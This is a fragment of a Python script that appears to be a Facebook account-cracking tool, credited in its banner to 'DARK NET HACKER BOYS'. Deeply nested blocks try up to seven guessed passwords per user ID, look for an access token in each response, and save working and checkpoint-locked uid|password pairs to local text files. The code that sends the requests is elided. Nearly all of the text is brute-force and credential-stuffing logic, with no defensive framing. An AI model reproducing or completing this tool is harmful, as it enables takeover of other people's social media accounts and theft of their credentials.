...
logo ="""
 ...
 |_____/       |_| \_|      |_|  |_|      |____/ \____/  |_| |_____/  
                                                                       ...
                                                                       """
     "\033[1;92m➣ \033[1;92mDEVOLPER   :     ASRAF MAHDI
     \033[1;91m➣ \033[1;92mFACEBOOK    :    DARK NET HACKER BOYS        
     \033[1;93m➣ \033[1;92mWHATSAPP   :    ®®®®®®®®® 
     \033[1;96m➣ \033[1;92mGITHUB          :     D-N-H-BOYS1
		...
		try:
			...
			if "access_token" in q:
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;33m [D-N-H-BOYS-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("D-N-H-BOYSok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;34m [D-N-H-BOYS-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("D-N-H-BOYScp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;35m [D-N-H-BOYS-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("D-N-H-BOYSok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;36m [D-N-H-BOYS-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("D-N-H-BOYScp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;31m [D-N-H-BOYS-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("D-N-H-BOYSok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;32m [D-N-H-BOYS-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("D-N-H-BOYScp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;33m [D-N-H-BOYS-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("D-N-H-BOYSok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;34m [D-N-H-BOYS-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("D-N-H-BOYScp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;35m [D-N-H-BOYS-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("D-N-H-BOYSok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;36m [D-N-H-BOYS-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("D-N-H-BOYScp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;31m [D-N-H-BOYS-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("D-N-H-BOYSok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;32m [D-N-H-BOYS-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("D-N-H-BOYScp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
...
def choice_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [D-N-H-BOYS-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("D-N-H-BOYSok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;31m [D-N-H-BOYS-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("D-N-H-BOYScp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;36m [D-N-H-BOYS-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("D-N-H-BOYSok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;35m [D-N-H-BOYS-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("D-N-H-BOYScp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;34m [D-N-H-BOYS-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("D-N-H-BOYSok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [D-N-H-BOYS-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("D-N-H-BOYScp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [D-N-H-BOYS-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("D-N-H-BOYSok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;31m [D-N-H-BOYS-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("D-N-H-BOYScp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;36m [D-N-H-BOYS-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("D-N-H-BOYSok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;35m [D-N-H-BOYS-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("D-N-H-BOYScp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;34m [D-N-H-BOYS-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("D-N-H-BOYSok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;23m [D-N-H-BOYS-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("D-N-H-BOYScp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [D-N-H-BOYS-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("D-N-H-BOYSok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;31m [D-N-H-BOYS-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("D-N-H-BOYScp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
